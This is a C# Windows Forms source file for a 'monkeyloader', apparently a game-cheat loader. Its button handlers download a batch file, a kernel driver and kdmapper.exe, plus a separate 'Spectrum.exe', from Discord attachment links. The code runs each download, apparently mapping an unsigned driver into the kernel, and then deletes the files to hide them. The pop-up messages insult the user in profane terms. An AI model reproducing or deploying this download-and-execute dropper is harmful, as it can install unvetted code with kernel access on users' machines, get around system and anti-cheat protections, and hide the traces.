using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading;
using System.Media;

namespace monkeyloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Dont close this shit when it pops up dumbass loader made by ranee0974 ezzzzz");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile("https://cdn.discordapp.com/attachments/918691850905333763/918691878084440094/loaderformonkeys.bat", "loaderformonkeys.bat");
                client.DownloadFile("https://cdn.discordapp.com/attachments/918691850905333763/918691891615240222/matchdriver123.sys", "matchdriver123.sys");
                client.DownloadFile("https://cdn.discordapp.com/attachments/918691850905333763/918691941242257478/kdmapper.exe", "kdmapper.exe");
                Process driver = Process.Start("loaderformonkeys.bat");
                driver.WaitForExit();
                File.Delete("loaderformonkeys.bat");
                File.Delete("matchdriver123.sys");
                File.Delete("kdmapper.exe");
                MessageBox.Show("It is that ez stupid ape");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("why in the fuck do u need a loader for opening the fucking file LOL");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile("https://cdn.discordapp.com/attachments/918691850905333763/918693096986902588/Spectrum.exe", "Spectrum.exe");
                Process Cock = Process.Start("Spectrum.exe");
                Cock.WaitForExit();
                File.Delete("Spectrum.exe");
            }
        }
    }
}
